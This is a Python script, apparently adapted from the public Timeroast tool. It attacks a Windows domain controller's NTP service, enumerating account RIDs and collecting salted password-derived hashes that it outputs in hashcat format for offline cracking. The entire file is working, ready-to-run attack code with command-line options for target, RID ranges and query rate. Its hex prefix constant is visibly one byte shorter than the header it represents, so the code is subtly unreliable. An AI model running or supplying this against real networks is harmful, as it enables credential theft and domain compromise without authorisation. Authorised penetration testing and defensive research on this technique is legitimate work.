#!/usr/bin/env python3

##
## https://github.com/SecuraBV/Timeroast/blob/main/timeroast.py
##

"""
ntp_roast: A script to perform NTP Timeroast attacks against a DC using MD5 authenticator.
Outputs hashcat-compatible hashes for offline cracking.
"""

from argparse import ArgumentParser, FileType, ArgumentTypeError, RawDescriptionHelpFormatter
from binascii import hexlify, unhexlify
from itertools import chain
from select import select
from socket import socket, AF_INET, SOCK_DGRAM
from struct import pack, unpack
from sys import stdout
from time import time
from typing import Iterable, List, Tuple

# --- Constants --------------------------------------------------------------
# Base NTP query using MD5 authenticator; append 4-byte RID + dummy checksum.
NTP_PREFIX = unhexlify(
    'db0011e9000000000001000000000000'
    'e1b8407debc7e5060000000000000000'
    '00000000000000e1b8428bffbfcd0a'
)
DEFAULT_RATE = 180         # Queries per second
DEFAULT_TIMEOUT = 24       # Seconds without response before quitting

# --- Core Functions --------------------------------------------------------
def parse_rid_ranges(arg: str) -> Iterable[int]:
    """
    Parse comma-separated RID ranges like "512-580,600,700-710" into an iterable of ints.
    Raises ArgumentTypeError on invalid input.
    """
    try:
        ranges = []
        for part in arg.split(','):
            if '-' in part:
                start, end = map(int, part.split('-'))
                if not (0 <= start < end < 2**31):
                    raise ValueError
                ranges.append(range(start, end + 1))
            else:
                rid = int(part)
                if not (0 <= rid < 2**31):
                    raise ValueError
                ranges.append([rid])
        return chain(*ranges)
    except Exception:
        raise ArgumentTypeError(f"Invalid RID ranges: '{arg}'")


def hashcat_format(rid: int, hashval: bytes, salt: bytes) -> str:
    """Format the result for hashcat (mode 31300) with the $sntp-ms$ prefix."""
    return f"{rid}:$sntp-ms${hexlify(hashval).decode()}${hexlify(salt).decode()}"


def roast_ntp(
    dc_host: str,
    rids: Iterable[int],
    rate: int,
    timeout: float,
    use_old_password: bool,
    src_port: int = 0,
) -> List[Tuple[int, bytes, bytes]]:
    """
    Send timed NTP queries embedding each RID, collect MD5(MD4(password)||response[0:48]) hashes.
    Stops when all RIDs tried or no successful reply for 'timeout' seconds.
    Returns list of (rid, md5hash, salt) tuples.
    """
    key_flag = (1 << 31) if use_old_password else 0
    results = []
    last_response = time()
    seen = set()

    with socket(AF_INET, SOCK_DGRAM) as sock:
        # Bind to allow receiving replies; may require root for port 123
        try:
            sock.bind(('0.0.0.0', src_port))
        except PermissionError:
            raise PermissionError(
                f"Insufficient privileges to bind to port {src_port}."
            )

        interval = 1.0 / rate
        rid_iter = iter(rids)

        while time() < last_response + timeout:
            # Send next RID query if available
            try:
                rid = next(rid_iter)
                payload = NTP_PREFIX + pack('<I', rid ^ key_flag) + b'\x00' * 16
                sock.sendto(payload, (dc_host, 123))
            except StopIteration:
                rid = None

            # Wait up to 'interval' for a reply
            ready, _, _ = select([sock], [], [], interval)
            if ready:
                data, _ = sock.recvfrom(120)
                if len(data) == 68:
                    salt = data[:48]
                    resp_rid = unpack('<I', data[-20:-16])[0] ^ key_flag
                    hash_val = data[-16:]
                    if resp_rid not in seen:
                        seen.add(resp_rid)
                        results.append((resp_rid, hash_val, salt))
                        last_response = time()
        return results

# --- Argument Parsing ------------------------------------------------------
def build_arg_parser() -> ArgumentParser:
    parser = ArgumentParser(
        formatter_class=RawDescriptionHelpFormatter,
        description=(
            "Perform NTP 'Timeroast' against a DC and output hashcat-formatted 31300 hashes."
        ),
    )
    parser.add_argument(
        'dc', help='DC hostname or IP running NTP service.'
    )
    parser.add_argument(
        '-r', '--rids', type=parse_rid_ranges,
        default=range(1, 2**31),
        help='Comma-separated RID list or ranges (e.g. "512-580,600").'
    )
    parser.add_argument(
        '-a', '--rate', type=int, default=DEFAULT_RATE,
        help='NTP queries per second (default: %(default)s).'
    )
    parser.add_argument(
        '-t', '--timeout', type=int, default=DEFAULT_TIMEOUT,
        help='Seconds to wait without replies before exiting (default: %(default)s).'
    )
    parser.add_argument(
        '-l', '--old-hashes', action='store_true',
        help='Use old password hashes instead of current.'
    )
    parser.add_argument(
        '-p', '--src-port', type=int, default=0,
        help='Local UDP port to bind for replies (default: dynamic).'
    )
    parser.add_argument(
        '-o', '--out', type=FileType('w'), default=stdout,
        help='Output file (defaults to stdout).'
    )
    return parser

# --- Entry Point ----------------------------------------------------------
def main() -> None:
    parser = build_arg_parser()
    args = parser.parse_args()

    results = roast_ntp(
        dc_host=args.dc,
        rids=args.rids,
        rate=args.rate,
        timeout=args.timeout,
        use_old_password=args.old_hashes,
        src_port=args.src_port,
    )

    for rid, hash_val, salt in results:
        print(hashcat_format(rid, hash_val, salt), file=args.out)


if __name__ == '__main__':
    main()
